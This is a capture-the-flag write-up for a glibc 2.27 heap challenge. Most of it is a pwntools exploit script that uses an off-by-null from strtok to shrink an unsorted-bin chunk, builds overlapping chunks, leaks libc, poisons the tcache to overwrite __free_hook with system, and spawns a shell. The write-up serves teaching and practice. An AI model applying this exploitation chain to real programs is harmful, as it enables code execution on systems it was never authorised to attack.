---
title: "House of Einherjar — Achieving Arbitrary Write via Off-by-Null Chunk Shrinking"
ctf: "DASCTF X GFCTF 2024"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-06-17"
lat: 40.65
lng: 210.06
summary: "Leveraging strtok to trigger an off-by-null byte corruption on an active unsorted bin chunk size, forcing alignment shifts that create overlapping chunks and expose tcache pointers."
tags:
  - "heap"
  - "unsortedbin"
  - "off-by-null"
  - "chunk-shrinking"
  - "tcache-poisoning"
  - "house-of-einherjar"
  - "glibc-2.27"
---

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def malloc(size,data):
    global count
    r.sendlineafter(b"> ",b"1")
    r.sendlineafter(b"size? ",str(size).encode())
    r.sendlineafter(b"str? " ,data)
    r.recvuntil(b'stored at ')
    idx = int(r.recvline().split(b"!")[0])
    return idx

def free(idx):
    r.sendlineafter(b"> ",b"3")
    r.sendlineafter(b"idx? ",str(idx).encode())

def tok(idx,dia):
    r.sendlineafter(b"> ",b"2")
    r.sendlineafter(b"idx? ",str(idx).encode())
    r.sendlineafter(b"delim? ",dia)


def main():
    global r
    r = conn()
```
   
   Okay, in this challenge, we will learn how to get an arbitrary write without using a use-after-free (UAF) bug. 
    It seems to be easy, so let's start. First, we need to fill the 0x120 tcache bin completely by allocating 
    7 chunks of size 0x118. This ensures that when we free our main chunk later, it passes right into 
    the Unsorted Bin.
```python
    entry_11 = []
    for i in range(7):
        entry_11.append(malloc(0x118,b""))
    
    chkA = malloc(0x18,b"B"*0x18)
    chkB = malloc(0x118,b"\x00"*0xf0+p64(0x100))
    cons = malloc(0x118,b"bwards")
    grd  = malloc(0x18,b"guard")

    for i in entry_11:
        free(i)
```
    
   Now we need to fill the 0x90 tcache bin by making 7 allocations of size 0x88. This sets up our 
    next step so we can carve from the Unsorted Bin smoothly. Once that's done, we can free chkB 
    straight into the Unsorted Bin since its tcache is already full.
    
```python
    for i in range(7):
        malloc(0x88,b"")

    free(chkB)
```
   
   Here we abuse the string token function to get our off-by-null. By hitting chkA with \x21, we overwrite 
    the size byte of chkB from 0x21 to null. This shrinks chkB's size inside the Unsorted Bin tracker 
    down to 0x100.
```python
    tok(chkA,b"\x21")
    
    top = malloc(0x88,b"\x00"*0x80+p64(0x90))

    chkC = malloc(0x48,b"\n")

    for i in range(7):
        free(i)
    
    free(top)
    free(cons)
```
    
  Now let's get the leak. We use the token function on chkC with \xff to skip past null bytes. Since chkC 
    is trapped inside a free Unsorted Bin block due to the backward consolidation overlapping, this spills 
    the raw libc leaks cleanly.
```python
    tok(chkC,b"\xff")

    lib = u64(r.recv(6).ljust(8,b"\x00")) - 0x3e0a0a
    log.success(f"LEAK:\nlibc:{hex(lib)}\n")
    libc.address = lib
```
   
   That we have our libc leak, we can easily target __free_hook. Since this is an older glibc version, 
    we don't need to bypass Safe Linking since pointers are stored raw. We can just free chkC into the tcache, 
    allocate a larger 'big' chunk to cover it, and overwrite its tcache next pointer directly.
```python
    free(chkC)
    malloc(0x238,b"\x00"*0x88+p64(0x50)+p64(libc.symbols['__free_hook']))
```
   Our target chunk will be returned after the second malloc call. The first malloc claims the old chkC 
    spot, and the following allocation pops our target hook address and grants us our arbitrary write.
```python
    binsh = malloc(0x48,b"/bin/sh\x00")
    malloc(0x48,p64(libc.symbols['system']))
```
   Finally, we gain access to the hook, allowing us to overwrite it with system. From here, calling free 
    on our string chunk triggers system("/bin/sh") and pops our shell.
```python
    free(binsh)
    r.interactive()

if __name__ == "__main__":
    main()
```
